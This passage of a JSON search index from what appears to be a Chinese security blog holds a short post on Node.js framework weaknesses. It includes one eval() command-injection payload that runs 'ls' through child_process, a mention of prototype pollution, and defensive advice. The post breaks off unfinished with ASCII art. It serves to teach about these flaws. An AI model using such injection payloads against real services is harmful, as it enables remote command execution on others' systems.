!_,.:\n\n\nQUghIFRoYXQncyBmb3IgS2FsISEKV2FpdCwgd2hvIGFyZSB5b3U&#x2F;CldobydzIHRoaXMgc2Fzc3kgbG9zdCBicmF0PwpXaHkgZG8geW91IGxpa2UgS2FsPyBObyBCbGF6ZSEhPwpBbnl3YXkhIENvbWUgd2l0aCBtZSEgSGVscCBtZSBmaW5kIFJlZCE&#x3D;\n","categories":["Web"]},{"title":"框架解构","url":"/blog233.github.io/2024/12/23/%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%84/","content":"安全无止境，继续前进吧！\n再坚固的土石解构，也有它的弱点；看似坚不可摧的巨像力大无穷，却挡不住源石法术；网络框架也是如此，钻研框架底层是很有必要的；不管你是想优化它，还是想“利用”它。–By Mudrock\n\nNode.jsNode.js是经典的JavaScript语言框架，用于执行前端项目中的JavaScript代码；\n命令执行由危险函数引起的代码执行漏洞；和PHP一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现；\neval()在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为”eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function；\n?eval=require(&quot;child_process&quot;).execSync(&#x27;ls&#x27;)\n\n原型链污染攻击者通过修改对象的原型链，影响所有继承该原型的子对象；\n防护措施\n避免使用不安全的函数 如eval()，尽量使用安全的替代方案；\n\n严格过滤和验证用户输入 确保所有输入都经过严格的验证和过滤；\n\n及时更新依赖库 确保使用最新版本的依赖库，修复已知漏洞；\n\n\nJwtToken验证框架，用于实现身份认证；\nYiiLaraveThinkPHP&lt;- To be continued  _(:3 ∠)__\n  く__,.ヘヽ.        /  ,ー､ 〉\n           ＼ ', !-─‐-i  /  /´\n           ／｀ｰ'       L/／｀ヽ､\n         /   ／,   /|   ,   ,       ',\n       ｲ   / /-‐/  ｉ  L_ ﾊ ヽ!   i\n        ﾚ ﾍ 7ｲ｀ﾄ   ﾚ'ｧ-ﾄ､!ハ|   |\n          !,/7 '0'     ´0iソ|    |\n          |.从\"    _     ,,,, / |./    |\n          ﾚ'| i＞.､,,__  _,.イ /   .i   |\n            ﾚ'| | / k_７_/ﾚ'ヽ,  ﾊ.  |\n              | |/i 〈|/   i  ,.ﾍ |  i  |\n             .|/ /  ｉ：    ﾍ!    ＼  |\n              kヽ>､ﾊ    _,.ﾍ､    /､!\n              !'〈//｀Ｔ´', ＼ ｀'7'ｰr'\n              ﾚ'ヽL__|___i,___,ンﾚ|ノ\n                  ﾄ-,/  |___./\n                  'ｰ'    !_,.:\n","categories":["Web"]}]